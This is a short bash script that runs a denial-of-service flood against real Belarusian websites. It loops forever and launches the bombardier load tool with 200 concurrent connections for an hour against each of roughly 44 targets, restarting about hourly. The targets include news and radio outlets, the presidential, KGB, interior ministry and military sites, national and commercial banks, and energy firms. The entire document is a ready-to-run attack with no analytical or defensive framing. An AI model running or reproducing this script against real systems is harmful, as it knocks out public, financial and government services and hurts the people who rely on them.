#!/bin/bash -x

DESTS=( "http://belta.by/", "https://sputnik.by/", "https://www.tvr.by/" "https://www.sb.by/" "https://belmarket.by/" "https://www.belarus.by/" "https://belarus24.by/" "https://ont.by/" "https://www.024.by/" "https://www.belnovosti.by/" "https://mogilevnews.by/" "https://www.mil.by/" "https://yandex.by/" "https://www.slonves.by/" "http://www.ctv.by/" "https://radiobelarus.by/" "https://radiusfm.by/" "https://alfaradio.by/" "https://radiomir.by/" "https://radiostalica.by/" "https://radiobrestfm.by/" "https://www.tvrmogilev.by/" "https://minsknews.by/" "https://zarya.by/" "https://grodnonews.by/" "https://rec.gov.by/ru" "https://president.gov.by/ru" "https://www.mvd.gov.by/ru" "http://www.kgb.by/ru/" "www.prokuratura.gov.by" "www.mil.by" "www.government.by" "www.prokuratura.gov.by" "www.nbrb.by" "https://belarusbank.by/" "https://brrb.by/" "https://www.belapb.by/" "https://bankdabrabyt.by/" "https://belinvestbank.by/individual" "https://bgp.by/ru/" "https://www.belneftekhim.by" "http://www.bellegprom.by" "https://www.energo.by" "http://belres.by/ru/")
TIME="60m"
CONNECTIONSPERTARGET=200

while true
do
    for DEST in ${DESTS[@]}
    do
        bombardier -c $CONNECTIONSPERTARGET -d $TIME -l $DEST &
    done
	sleep 3550s
done
